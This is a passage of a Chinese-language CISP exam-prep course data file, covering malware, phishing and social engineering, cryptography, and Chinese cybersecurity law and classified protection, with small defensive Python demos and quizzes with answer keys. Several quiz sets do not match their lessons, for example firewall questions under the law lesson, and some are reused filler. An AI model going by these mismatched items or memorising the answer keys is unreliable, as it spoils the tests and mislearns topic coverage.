    codeExample: { language: 'python', code: '# 恶意软件特征分析\ndef analyze_file(filename, file_info):\n    risks = []\n    if file_info.get("size", 0) > 100 * 1024 * 1024:\n        risks.append("异常大文件")\n    if file_info.get("ext", "") in [".exe", ".scr", ".bat"]:\n        risks.append("可执行文件")\n    if file_info.get("unsigned", False):\n        risks.append("未数字签名")\n    return risks\n\ntest_file = {"size": 15 * 1024 * 1024, "ext": ".exe", "unsigned": True}\nprint(f"风险评估: {analyze_file(\"test.exe\", test_file)}")', description: '模拟恶意软件检测' },
    quiz: [{"id":"q4-1","question":"病毒和蠕虫的主要区别是？","options":["病毒需要宿主文件，蠕虫独立传播","蠕虫需要宿主文件，病毒独立传播","两者完全相同","病毒只能感染Linux"],"correctIndex":0,"explanation":"病毒需要依附宿主文件传播，蠕虫是独立程序。"},{"id":"q4-2","question":"勒索软件的主要攻击手段是？","options":["删除用户文件","加密用户文件并索要赎金","窃取用户密码","占用网络带宽"],"correctIndex":1,"explanation":"勒索软件加密用户文件并要求支付赎金才能解密。"},{"id":"q4-3","question":"以下哪种恶意软件会记录用户键盘输入？","options":["广告软件","间谍软件（键盘记录器）","蠕虫","勒索软件"],"correctIndex":1,"explanation":"间谍软件中的键盘记录器（Keylogger）会记录用户的键盘输入。"},{"id":"q4-4","question":"木马程序的主要特点是？","options":["自我复制","伪装成合法软件","加密文件","占用CPU"],"correctIndex":1,"explanation":"木马程序伪装成合法软件，不自我复制。"},{"id":"q4-5","question":"防范恶意软件最有效的组合是？","options":["只装杀毒软件","杀毒软件+防火墙+用户安全意识","只用防火墙","不需要任何防护"],"correctIndex":1,"explanation":"技术手段（杀毒软件、防火墙）和人员意识相结合。"}],
    expertNotes: dayExpertNotes[4],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  {
    id: 'day-5', day: 5, week: 1, title: '社会工程学攻击',
    objectives: ['理解社会工程学', '了解常见手法', '掌握防范技巧'],
    content: '# 社会工程学攻击\n\n> 📋 **本节大纲**\u2003三大心理原理(信任/好奇/恐惧) | 五大手法(钓鱼/鱼叉/鲸钓/电话诈骗/尾随) | 防范体系\n\n## 概述\n\n社会工程学（Social Engineering）被称为"最危险的漏洞是人"。攻击者不直接攻击技术系统，而是利用人性的弱点——好奇心、恐惧、贪婪、信任——操纵人员主动泄露信息或执行危险操作。据统计，超过90%的网络攻击都包含社会工程学成分。CISP考试对钓鱼攻击的分类和防范措施是重要考点。\n\n## 社会工程学三大心理原理\n\n### 一、获得信任（建立可信身份）\n\n攻击者通过伪装成可信赖的角色降低受害者的警惕性：\n- 伪装IT部门："您好，我是IT部小王，您的电脑有安全告警，需要远程检查"\n- 利用权威身份："我是王总，紧急转账到这个账户"（CEO诈骗/BEC诈骗）\n- 建立友好关系：长期在社交媒体上与目标互动，逐渐获取信任\n\n**防御：**必须通过独立渠道（如已知电话号码回拨）验证身份，不能仅靠来电/邮件中提供的信息\n\n### 二、利用好奇心或贪婪\n\n\"点击领取100元优惠券\"、\"观看独家曝光视频\"、\"您的包裹无法派送请查看\"——这些诱饵利用的是人们难以抑制的好奇心和占便宜心理。\n\n### 三、制造恐惧或紧迫感\n\n\"您的银行账户已被冻结，请立即验证\"、\"你的电脑感染了病毒，请即刻下载杀毒工具\"——迫使用户在恐惧和压力下不经思考就执行操作。\n\n**防御：**任何制造紧迫感的请求都应暂停，深呼吸，冷静判断——真正的机构不会通过恐吓方式沟通。\n\n## 五大攻击手法\n\n### 一、网络钓鱼（Phishing）——最常见\n\n**手法：**大量群发看似合法的邮件（银行/快递/税务局），诱导点击链接或下载附件。\n**特征：**发件人地址近似但不完全相同（amazon-support@amaz0n.com）、语法错误、泛称而非你的真名。\n**后果：**链接导向虚假登录页→输入密码→账户被盗；附件含恶意软件→电脑被控。\n\n### 二、鱼叉式钓鱼（Spear Phishing）——定制化高效攻击\n\n**与普通钓鱼的核心区别：**不是群发而是针对特定个人或组织，攻击前会进行信息收集。\n**手法：**研究目标社交媒体、职位、同事名字，定制高度逼真的诱饵邮件。\n**案例：**攻击者知道你刚参加完行业会议，发来"会议资料请查收"的邮件——成功率远高于泛称的钓鱼。\n**防御：**只有"内容太精准了"反而要警惕。通过其他渠道（如Slack/Teams）确认发件人是否真的发了邮件。\n\n### 三、鲸钓（Whaling）——针对高管的钓鱼\n\n**目标：**CEO、CFO等高管，追求的是单次高价值回报（如授权大额转账）。\n**手法：**伪装银行或监管机构，发送法律传票或合规通知，利用高管对法律后果的恐惧。\n\n### 四、电话诈骗（Vishing = Voice Phishing）\n\n**手法：**冒充银行客服、公安、税务局，声称"你的银行账户涉嫌洗钱需要配合调查"。\n**技术辅助：**伪造来电显示（显示为110或银行官方号码）。\n**防御：**挂断后主动拨打官方客服电话验证。官方机构不会通过电话索要密码或验证码。\n\n### 五、尾随/肩窥（Tailgating / Shoulder Surfing）——物理社会工程\n\n**尾随：**跟随刷卡进入的员工通过门禁——"能帮我开下门吗，忘带卡了"。**肩窥：**在公共场合偷窥他人屏幕上的密码、邮件等敏感信息。\n**防御：**严格执行一人一卡、可疑人员主动询问、防窥屏贴膜\n\n## 防范体系\n\n**最重要：安全意识培训——人员是社会工程学的唯一防线。**\n\n**技术措施：**\n- 邮件安全网关：SPF/DKIM/DMARC防邮件伪造\n- URL过滤：阻断已知钓鱼网站\n- MFA多因素认证：即使密码泄露，攻击者也无法登录\n- 沙箱：可疑附件在隔离环境中打开检测\n\n**管理措施：**\n- 大额转账必须双重确认（电话+审批）\n- 定期钓鱼演练，统计点击率并针对性培训\n- 建立"可疑行为报告"的便捷渠道\n\n## \n## 🔴 高频考点\n\n· 普通钓鱼(群发) vs **鱼叉钓鱼(定制+信息收集)** vs 鲸钓(高管)——三类钓的区分层次常考\n· 社会工程学利用的是**人性弱点**而非技术漏洞，**安全意识培训**是唯一有效长期防御\n· Spear Phishing(鱼叉式)和Whaling(鲸钓)的英文名称要能对上\n## 💜 记忆口诀\n\n· **三类钓鱼**："普通撒网、鱼叉瞄准、鲸钓大鱼(高管)"\n· **四大心理**："信-急-贪-怕"——信任(伪装)、紧迫(限时)、贪婪(免费)、恐惧(吓唬)\n学习建议\n- 普通钓鱼(群发) vs 鱼叉钓鱼(定制) vs 鲸钓(高管)的区别要记住\n- 社会工程学利用的不是技术漏洞，是人性弱点\n- 安全意识培训是唯一真正有效的长期防御',
    codeExample: { language: 'python', code: '# 钓鱼邮件检测\ndef detect_phishing(email):\n    risks = []\n    suspicious = ["amaz0n", "go0gle", "app1e", "paypa1"]\n    for domain in suspicious:\n        if domain in email.get("from", "").lower():\n            risks.append(f"可疑域名: {domain}")\n    urgent_words = ["紧急", "立即", "账户危险", "最后警告"]\n    for word in urgent_words:\n        if word in email.get("body", ""):\n            risks.append(f"紧迫性操纵: {word}")\n    return risks\n\nemail = {"from": "security@app1e.com", "body": "您的账户异常，请立即验证!"}\nprint(f"风险评估: {detect_phishing(email)}")', description: '模拟钓鱼邮件检测' },
    quiz: [{"id":"q5-1","question":"社会工程学攻击主要利用什么？","options":["技术漏洞","人的心理弱点","网络协议缺陷","硬件漏洞"],"correctIndex":1,"explanation":"社会工程学攻击利用人的心理弱点进行欺骗。"},{"id":"q5-2","question":"以下哪种是社会工程攻击？","options":["SQL注入","网络钓鱼（Phishing）","DDoS攻击","缓冲区溢出"],"correctIndex":1,"explanation":"网络钓鱼是社会工程攻击的典型代表。"},{"id":"q5-3","question":"防范社会工程攻击最有效的方法是？","options":["安装防火墙","安全意识和培训","使用VPN","加密数据"],"correctIndex":1,"explanation":"社会工程攻击针对的是人，最有效的防范是提高安全意识。"},{"id":"q5-4","question":"尾随进入（Tailgating）属于什么类型的攻击？","options":["网络攻击","物理+社会工程攻击","密码攻击","DDoS攻击"],"correctIndex":1,"explanation":"尾随进入利用人的礼貌和疏忽，属于物理+社会工程攻击。"},{"id":"q5-5","question":"钓鱼邮件通常包含什么特征？","options":["正式的发件人地址","紧急的语气和可疑的链接","正确的公司logo","正确的语法"],"correctIndex":1,"explanation":"钓鱼邮件通常使用紧急语气催促用户点击可疑链接。"}],
    expertNotes: dayExpertNotes[5],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  {
    id: 'day-6', day: 6, week: 1, title: '密码学基础概念',
    objectives: ['理解密码学术语', '了解加密解密原理', '掌握基本分类'],
    content: '# 密码学基础概念\n\n> 📋 **本节大纲**\u2003核心术语 | 对称vs非对称加密(对比表) | 混合加密(TLS原理) | 四大应用场景\n\n## 概述\n\n密码学（Cryptography）是研究如何保护信息安全的数学科学，是CISP考试的核心模块之一。密码学不仅要"让人看不懂"（加密），还要确保"没人偷偷改"（完整性）、"确定是你干的"（不可否认）。密码学是整个信息安全体系的技术基石。\n\n## 密码学核心术语\n\n**明文（Plaintext）：**加密前可读的原始信息。"明天开会"就是明文。\n\n**密文（Ciphertext）：**加密后的不可读数据。同样的"明天开会"经过AES加密后可能变成"7f3a0e8b..."的乱码。\n\n**加密（Encryption）：**用密钥和算法将明文转为密文的过程。明文+密钥→算法→密文。\n\n**解密（Decryption）：**用密钥将密文还原为明文的过程。密文+密钥→算法→明文。\n\n**密钥（Key）：**控制加解密的核心参数。密码学核心原则（Kerckhoffs原则）：系统的安全性应完全依赖密钥的保密，而不应依赖算法的保密。算法可以公开，密钥必须保密。\n\n**算法（Algorithm）：**加解密使用的数学方法（AES/RSA/ECC等）。现代密码学算法都是公开的、经过学术界严格审查的——安全依靠密钥，不靠"算法保密"。\n\n## 对称加密 vs 非对称加密\n\n这是CISP考试最高频的密码学考点，必须清晰区分。\n\n### 对称加密（Symmetric Encryption）\n\n**核心理念：**加密和解密使用**同一个**密钥。发送方和接收方共享密钥。\n\n**工作流程：**\n1. 双方事先共享密钥（通过安全信道）\n2. 发送方用密钥加密明文→密文\n3. 接收方用同一密钥解密密文→明文\n\n**优势：**速度快（比非对称快约1000倍），适合加密大量数据（文件、数据库、通信批量加密）\n\n**劣势：**密钥分发困难——你怎么把密钥安全地发给对方？如果你们已经有一个安全信道，为什么还需要加密？这就是"密钥分发问题"（Key Distribution Problem）。\n\n**代表算法：**\n- **AES（高级加密标准）：**当前最广泛使用的对称加密算法。分组长度128位，密钥长度128/192/256位\n- **DES：**56位密钥，1998年被暴力破解（56位密钥空间太小），已废弃\n- **3DES：**DES的三次加密增强版，等效112位密钥，正在被AES替代\n- **SM4：**中国国密标准对称密码算法，128位分组和密钥\n\n### 非对称加密（Asymmetric Encryption / 公钥密码）\n\n**核心理念：**使用一对数学上相关但无法互相推导的密钥——**公钥和私钥**。\n\n**工作流程：**\n1. 生成密钥对：公钥（可公开）和私钥（严格保密）\n2. **加密场景：**任何人都可以用接收方的公钥加密数据，只有接收方的私钥能解密\n3. **签名场景：**发送方用自己私钥签名，任何人都可以用发送方的公钥验证\n\n**优势：**完美解决了密钥分发问题——公钥可以通过任意渠道传输（网站、邮件、写在墙上都可以），不怕被窃听。\n\n**劣势：**计算量大、速度慢（不适用于加密大数据）。\n\n**代表算法：**\n- **RSA：**最广泛使用的非对称算法，基于大整数质因数分解的数学难题。推荐密钥长度≥2048位（2024+）。1024位RSA已被证明可被破解。\n- **ECC（椭圆曲线密码学）：**相比RSA，同等安全强度下密钥更短——256位ECC ≈ 3072位RSA安全性。移动设备首选。\n- **SM2：**中国国密标准椭圆曲线公钥密码算法\n\n### 对称 vs 非对称 速查表\n\n| 维度 | 对称加密 | 非对称加密 |\n|------|---------|-----------|\n| 密钥数量 | 1个（加密解密同一密钥） | 2个（公钥+私钥） |\n| 速度 | 快（~1000倍于非对称） | 慢 |\n| 密钥分发 | 困难（需要安全信道） | 简单（公钥可公开） |\n| 典型用途 | 数据加密存储/传输 | 密钥交换、数字签名 |\n| 代表算法 | AES、SM4 | RSA、ECC、SM2 |\n\n### 混合加密（Hybrid Encryption）——实际应用的标准方案\n\n**只用对称加密的问题：**密钥怎么安全传给对方？\n**只用非对称加密的问题：**加密大数据太慢了。\n\n**混合方案 — TLS/HTTPS的标准实践：**\n1. 用非对称加密（RSA/ECC）安全交换一个临时的对称密钥\n2. 后续所有大量数据用对称加密（AES）加密——速度快\n3. 综合了两者的优势：非对称解决密钥交换，对称解决数据加密\n\n这就是你访问任何HTTPS网站时浏览器和服务器之间发生的事情。\n\n## 密码学的四大应用\n\n**1. 数据机密性：**加密存储和传输——AES加密数据库、TLS加密网络通信\n**2. 数据完整性：**哈希函数验证数据未被篡改——下载文件校验SHA-256\n**3. 身份认证：**数字签名验证发送者身份——软件数字签名、邮件签名\n**4. 不可否认性：**私钥签名后无法否认"不是我签的"——电子合同的数字签名\n\n## \n## 🔴 高频考点\n\n· **对称加密vs非对称加密的核心区别**——对称=同密钥(快)、非对称=公钥+私钥(慢)\n· 混合加密=非对称交换密钥+对称加密数据——HTTPS/TLS的标准方案\n· AES分组长度128位，RSA基于大数分解，ECC基于椭圆曲线——三个算法数学基础要记住\n## 💜 记忆口诀\n\n· **对称vs非对称**："对称=一把钥匙两人用(快但分发难)、非对称=两把钥匙(公钥开门/私钥留着)"\n· **混合加密**："非对称送钥匙、对称加密数据"\n· **算法根基**：RSA=大数分解、ECC=椭圆曲线、AES=对称标准\n学习建议\n\n- 对称加密和非对称加密的核心区别是CISP必考题\n- 记住：混合加密 = TLS/HTTPS的标准方案\n- AES算法的分组长度（128位）和密钥长度（128/192/256）要记住\n- RSA基于大数分解、ECC基于椭圆曲线离散对数——知道数学基础',
    codeExample: { language: 'python', code: '# 简单XOR加密演示\ndef xor_encrypt(text, key):\n    return "".join(chr(ord(c) ^ ord(k)) for c, k in zip(text, key * (len(text) // len(key) + 1)))\n\nmessage = "Hello CISP"\nkey = "KEY"\n\nencrypted = xor_encrypt(message, key)\ndecrypted = xor_encrypt(encrypted, key)\n\nprint(f"原始: {message}")\nprint(f"加密: {repr(encrypted)}")\nprint(f"解密: {decrypted}")', description: '演示简单对称加密' },
    quiz: [{"id":"q6-1","question":"以下哪种是对称加密算法？","options":["RSA","AES","ECC","DSA"],"correctIndex":1,"explanation":"AES是对称加密算法。"},{"id":"q6-2","question":"数字签名使用什么密钥进行签名？","options":["接收者的公钥","发送者的私钥","发送者的公钥","共享密钥"],"correctIndex":1,"explanation":"数字签名使用发送者的私钥进行签名。"},{"id":"q6-3","question":"SHA-256的输出长度是多少位？","options":["128位","160位","256位","512位"],"correctIndex":2,"explanation":"SHA-256的输出长度是256位。"},{"id":"q6-4","question":"PKI体系中，CA的作用是什么？","options":["加密数据","签发和管理数字证书","存储用户密码","检测网络攻击"],"correctIndex":1,"explanation":"CA负责签发和管理数字证书。"},{"id":"q6-5","question":"HTTPS使用什么协议实现安全传输？","options":["IPSec","TLS/SSL","SSH","PGP"],"correctIndex":1,"explanation":"HTTPS使用TLS/SSL协议加密传输。"}],
    expertNotes: dayExpertNotes[6],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  {
    id: 'day-7', day: 7, week: 1, title: '第一周总结与测验',
    objectives: ['回顾第一周知识点', '检验学习成果', '查漏补缺'],
    content: '# 第一周学习总结\n\n## 本周学习内容\n\n### Day 1: 信息安全概述\n- 信息安全定义和重要性\n- CIA三要素：机密性、完整性、可用性\n- 安全威胁分类\n\n### Day 2: 信息安全发展历程\n- 通信安全→计算机安全→网络安全→信息化安全\n- 关键标准和事件\n\n### Day 3: 网络安全基本概念\n- OSI七层模型和TCP/IP四层模型\n- 常见网络攻击类型\n\n### Day 4: 恶意软件分类\n- 病毒、蠕虫、木马、勒索软件区别\n- 传播方式和防范\n\n### Day 5: 社会工程学攻击\n- 社会工程学原理\n- 钓鱼攻击和防范\n\n### Day 6: 密码学基础\n- 基本术语\n- 对称加密与非对称加密\n\n## 知识要点回顾\n\n| 知识点 | 核心内容 |\n|---------|----------|\n| CIA三要素 | 机密性、完整性、可用性 |\n| 恶意软件 | 病毒需要宿主，蠕虫独立 |\n| 社会工程学 | 利用人性弱点 |\n| 加密技术 | 对称加密速度快，非对称更安全 |\n\n## 下周预告\n\n第二周将学习：\n- 中国网络安全法律法规\n- 等级保护制度\n- 数据安全与个人信息保护',
    quiz: [{"id":"q7-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q7-2","question":"以下关于第一周总结与测验的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q7-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q7-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q7-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[7],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  // ========== Week 2: 信息安全法规 ==========
  {
    id: 'day-8', day: 8, week: 2, title: '中国网络安全法律法规体系',
    objectives: ['了解中国法律框架', '理解主要法规内容', '掌握合规要求'],
    content: '# 中国网络安全法律法规体系\n\n> 📋 **本节大纲**\u2003三部核心法律(网安法/数安法/个保法) | 关键配套法规速查表 | 违规后果对比\n\n## 概述\n\n中国已建立起以《网络安全法》《数据安全法》《个人信息保护法》三部法律为核心，配套多部行政法规和部门规章的网络安全法律体系。CISP考试对法律框架的考查逐年加重，重点在于区分三部核心法律的管辖范围和违规后果。\n\n## 三部核心法律\n\n### 一、《中华人民共和国网络安全法》（2017年施行）\n\n**定位：**网络安全领域基础性法律，侧重于网络运行安全和网络空间主权。\n\n**核心制度：**\n- **网络安全等级保护制度（等保2.0）：**所有网络运营者必须定级备案、安全建设、等级测评、监督检查\n- **关键信息基础设施（CII）保护：**对金融、能源、交通、通信等行业的关键系统施加更高的安全要求，包括数据境内存储和网络安全审查\n- **个人信息保护：**网络运营者收集使用个人信息需经用户同意、公开规则、不泄露篡改\n- **实名制：**为用户提供网络接入、发布信息等服务时必须要求真实身份信息\n\n**违规后果：**CII运营者不履行安全义务——罚款10-100万元，直接负责人罚款1-10万元\n\n### 二、《中华人民共和国数据安全法》（2021年施行）\n\n**定位：**规范数据处理活动，保障数据安全，促进数据开发利用。\n\n**核心制度：**\n- **数据分类分级保护：**将数据分为核心数据、重要数据、一般数据三级，分别施加保护\n- **数据安全审查制度：**对影响国家安全的数据处理活动进行安全审查\n- **数据出境管理：**重要数据出境需经安全评估，核心数据原则上不出境\n- **数据安全风险评估：**重要数据处理者定期开展风险评估\n\n**违规后果：**最高罚款1000万元，情节严重的责令停业整顿、吊销相关业务许可证\n\n### 三、《中华人民共和国个人信息保护法/PIPL》（2021年施行）\n\n**定位：**保护个人信息权益，规范个人信息处理活动。\n\n**核心内容：**\n- **七项处理原则：**合法正当必要诚信、目的限制、数据最小化、公开透明、质量保证、安全保障、责任明确\n- **数据主体七项权利：**知情权、查阅权、更正权、删除权（被遗忘权）、限制处理权、可携带权、反对权\n- **敏感个人信息特别保护：**生物识别、金融账户、行踪轨迹等需单独同意\n- **跨境传输规则：**需通过安全评估、签订标准合同或获得认证\n\n**违规后果：**最严厉——最高5000万元或上一年度营业额5%（取高者）\n\n## 关键配套法规速查\n\n| 法规 | 发布年份 | 核心要求 |\n|------|---------|---------|\n| 等保2.0 | 2019 | 定级备案-安全建设-等级测评-监督检查 |\n| CII安全保护条例 | 2021 | CII运营者安全义务、安全审查、检测预警 |\n| 网络安全审查办法 | 2022 | 影响国家安全的产品服务需申报审查 |\n| 数据出境安全评估办法 | 2022 | 出境数据超量或涉及重要/敏感数据需评估 |\n\n## \n## 🔴 高频考点\n\n· **PIPL罚款上限（5000万/年营业额5%）**三大法中处罚最重——选罚款上限时要区分哪个法\n· 三部法律管辖：网安法→网络运行安全、数安法→数据处理活动、PIPL→个人信息\n· CII（关键信息基础设施）概念在三大法中都有涉及\n## 💜 记忆口诀\n\n· **三法记法**："网(运行)·数(数据)·人(信息)"\n· **罚款层级**：网安法百万→数安法千万→PIPL五千万或五点\n· **CII八行业**："通能交金政水卫国"\n学习建议\n- 三部法律按管辖范围区分：网络安全法→网络运行安全、数据安全法→数据处理活动、PIPL→个人信息\n- PIPL罚款最高（5000万/5%营收），是三大法中处罚力度最重的\n- CII（关键信息基础设施）概念在三部法律中都有涉及',
    codeExample: { language: 'python', code: '# 合规检查清单\ndef check_compliance(features):\n    requirements = ["防火墙", "入侵检测", "日志审计", "数据加密", "应急预案"]\n    passed = sum(1 for req in requirements if features.get(req, False))\n    return passed, len(requirements)\n\nfeatures = {"防火墙": True, "入侵检测": True, "日志审计": True}\npassed, total = check_compliance(features)\nprint(f"合规检查: {passed}/{total} 项通过")\nprint(f"合规率: {(passed/total)*100:.1f}%")', description: '模拟合规检查' },
    quiz: [{"id":"q8-1","question":"以下哪种防火墙类型工作在OSI第4层？","options":["应用层防火墙","状态检测防火墙","代理防火墙","WAF"],"correctIndex":1,"explanation":"状态检测防火墙工作在传输层（第4层）。"},{"id":"q8-2","question":"IDS和IPS的主要区别是？","options":["IDS可以阻断攻击","IPS可以阻断攻击，IDS只能检测告警","两者功能完全相同","IDS比IPS更安全"],"correctIndex":1,"explanation":"IPS可以主动阻断攻击，IDS只能检测和告警。"},{"id":"q8-3","question":"TCP三次握手中，第二次握手发送的标志位是？","options":["SYN","ACK","SYN+ACK","FIN"],"correctIndex":2,"explanation":"第二次握手服务器回复SYN+ACK。"},{"id":"q8-4","question":"DNS欺骗攻击属于什么类型的攻击？","options":["物理攻击","中间人攻击","密码攻击","社会工程攻击"],"correctIndex":1,"explanation":"DNS欺骗通过伪造DNS响应属于中间人攻击。"},{"id":"q8-5","question":"防火墙默认策略应遵循什么原则？","options":["默认允许","默认拒绝","只允许80端口","按需决定"],"correctIndex":1,"explanation":"安全最佳实践：默认拒绝所有，按需开放。"}],
    expertNotes: dayExpertNotes[10],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-9', day: 9, week: 2, title: '等级保护制度',
    objectives: ['理解等级保护意义', '了解五个保护等级', '掌握定级流程'],
    content: '# 等级保护制度\n\n> 📋 **本节大纲**\u2003五个保护等级详解 | 定级流程五步 | 等保2.0"一个中心三重防护" | 测评要求速记\n\n## 概述\n\n网络安全等级保护制度（等保2.0）是中国网络安全领域最核心的制度安排，法律依据是《网络安全法》第21条。通俗讲就是"对信息系统分等级进行保护"——系统越重要，保护要求越高、测评频次越密、违规处罚越重。\n\n## 五个保护等级详解\n\n**第一级：自主保护级**\n- 系统破坏仅损害公民/法人合法权益，不损害社会公共利益和国家安全\n- 运营者自主定级、自主保护，不需要公安机关备案和测评\n- 典型：小型企业官网、个人博客\n\n**第二级：指导保护级**\n- 系统破坏对社会公共利益造成一般损害，但不危害国家安全\n- 需向公安机关备案，建议（非强制）进行等级测评\n- 典型：中型企业信息系统\n\n**第三级：监督保护级（最常见、考试最高频）**\n- 系统破坏对社会公共利益造成严重损害，或对国家安全造成一般损害\n- **必须**每年至少一次等级测评，由公安机关监督检查\n- 典型：政府门户网站、银行系统、电力调度系统、大型电商平台\n- CISP考试重点：三级是最高频考点，记住"每年至少一次测评"\n\n**第四级：强制保护级**\n- 系统破坏对国家安全造成严重损害\n- 至少每半年一次测评，公安机关强制监督检查\n- 典型：国家核心部委内部系统\n\n**第五级：专控保护级**\n- 系统破坏对国家安全造成特别严重损害\n- 由国家安全专门机构管控，测评要求为国家秘密\n- 典型：国家核心机密系统\n\n## 定级流程\n\n定级是等保的第一步也是关键一步：\n1. **确定定级对象：**识别需要保护的网络系统——一个系统一个定级\n2. **初步确定等级：**根据业务信息安全和系统服务安全两个维度综合评估\n3. **专家评审：**邀请行业专家和安全专家评审定级合理性\n4. **主管部门核准：**行业主管/监管部门对定级结果进行核准\n5. **公安机关备案：**三级以上系统必须到公安机关办理备案手续\n\n## 等保2.0的"一个中心、三重防护"\n\n等保2.0对三级系统的安全技术框架提出了"一个中心、三重防护"架构：\n- **安全管理中心：**统一管理所有安全设备和策略\n- **安全通信网络：**网络层面的安全防护（加密、VPN）\n- **安全区域边界：**网络边界的安全防护（防火墙、IDS/IPS）\n- **安全计算环境：**主机和应用层面的安全防护（访问控制、补丁管理）\n\n**安全管理五大领域：**安全管理制度、安全管理机构、安全管理人员、安全建设管理、安全运维管理\n\n## 测评要求速记\n\n| 等级 | 测评要求 | 备案要求 |\n|------|---------|---------|\n| 一级 | 不需要 | 不需要 |\n| 二级 | 建议测评 | 需备案 |\n| 三级 | **每年至少一次**（必考） | 需备案 |\n| 四级 | 至少每半年一次 | 需备案 |\n| 五级 | 国家专控 | 国家专控 |\n\n## \n## 🔴 高频考点\n\n· **三级等保"每年至少一次"测评**——最高频考点，一/二级不需要强制测评\n· 五级名词：自主(一)、指导(二)、**监督(三)**、强制(四)、专控(五)\n· 等保2.0架构："一个中心(安全管理中心)+三重防护(通信网络/区域边界/计算环境)"\n## 💜 记忆口诀\n\n· **五级名称**："自主(一)→指导(二)→监督(三)→强制(四)→专控(五)"\n· **测评频次**："一二不强制、三年一次、四半年一次、五国家定"\n学习建议\n- 三级是CISP最高频考点："每年至少一次测评"\n- 区分"自主"（一级）、"指导"（二级）、"监督"（三级）、"强制"（四级）、"专控"（五级）\n- "一个中心、三重防护"是等保2.0的核心安全技术架构',
    codeExample: { language: 'python', code: '# 等级保护定级模拟\ndef calculate_level(business_impact, service_scope):\n    score = business_impact * 0.6 + service_scope * 0.4\n    if score <= 1: return 1, "自主保护级"\n    elif score <= 2: return 2, "指导保护级"\n    elif score <= 3: return 3, "监督保护级"\n    elif score <= 4: return 4, "强制保护级"\n    else: return 5, "专控保护级"\n\n# 某电商平台评估\nlevel, name = calculate_level(business_impact=3, service_scope=3)\nprint(f"定级结果: 第{level}级 - {name}")', description: '模拟等级保护定级' },
    quiz: [{"id":"q9-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q9-2","question":"以下关于等级保护制度的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q9-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q9-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q9-5","question":"纵深防御（